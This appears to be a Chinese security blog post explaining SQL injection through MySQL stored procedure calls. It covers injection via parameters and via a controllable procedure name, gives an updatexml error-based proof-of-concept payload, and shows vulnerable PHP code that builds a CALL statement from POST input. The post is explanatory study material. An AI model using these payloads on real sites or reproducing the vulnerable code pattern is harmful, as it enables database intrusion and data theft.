---
title: Mysql 储存过程注入
date: 2019-05-07T02:42:17+08:00
date: 2019-05-07T02:42:17+08:00
lastmod: 2019-05-07T02:42:17+08:00
categories: ["网络安全"]
tags: ["sql注入"]
description:
---
### Mysql 储存过程注入

mysql有着储存过程这个功能, 这次作者刚好遇到注入点在调用储存过程的sql注入.



### 基本知识

mysql可以通过以下语句创建一个储存过程

```mysql
CREATE PROCEDURE sp_name(IN param1 INT,OUT param2 INT)
BEGIN
   # code
END
```

sp_name是名字, 为IN的参数是入参,为OUT的参数为返回值



调用储存过程的语句

```mysql
 CALL sp_name(1);
```



### 注入分析

从语法我们可以分析出我们的输入可能出现在两处,和作为参数进入储存过程

```mysql
CALL <储存过程名注入点>(<储存过程参数注入点>);
```



首先如果对参数过滤不严,无需进入储存过程就可以直接注入.用以下语句为例

```mysql
CALL test([可控点])
```

由于是直接执行,所以我们可直接注入语句例如`(select 1)`.由于语法问题,这个括号是必须的,这语句就变成了

```mysql
CALL test((select 1))
```

这种注入和普通注入差别不大,已有技巧基本可以套用.



如果参数不可控,但是方法名可控也可以进行注入.但是首先要得知一个存在的储存过程名,然后通过注释后续语句来进行自己语句

```
CALL [可控]()
```



示例poc

```
test((select updatexml(1,concat(0x7e,(select @@version),0x7e),1))) -- 
```

可以看到和参数注入差距不大,只是用于参数不可控,或被安全处理的情况.



最后一种可能,在储存过程中出现.虽然储存过程被认为非常安全,但是实际上如果编写不慎 例如进行动态sql拼接 还是会出现注入的.. 例如

```
# 来自网上的一个例子 _field和_table是参数
SET @strSql = CONCAT('SELECT ',_field,' FROM ',_table);
PREPARE stmt FROM @strSql;
EXECUTE stmt;
```



最后附上我遇上的一个漏洞代码

```php
<?php
if (isset($_POST['mode'])) {
    @$m = new mysqli('localhost', 'root', '123456', 'UseStudio_Develop');
    /*省略错误处理*/
    $ary = explode('&', $_POST['mode']);
     if (count($ary) == 1) {
        $sql = 'CALL ' . $m->real_escape_string($ary[0]) . '()';
    } else {
        $sql = 'CALL ' . $m->real_escape_string($ary[0]) . "('";
        for ($i = 1; $i < count($ary); $i++) {
            $sql.= $m->real_escape_string($ary[$i]);
            if ($i < count($ary) - 1) {
                $sql.= "','";
            }
        }
        $sql.= "')";
    }
    
    //执行查询，获取结果集
    $res = $m->query($sql);
    // 省略返回的代码
}
```





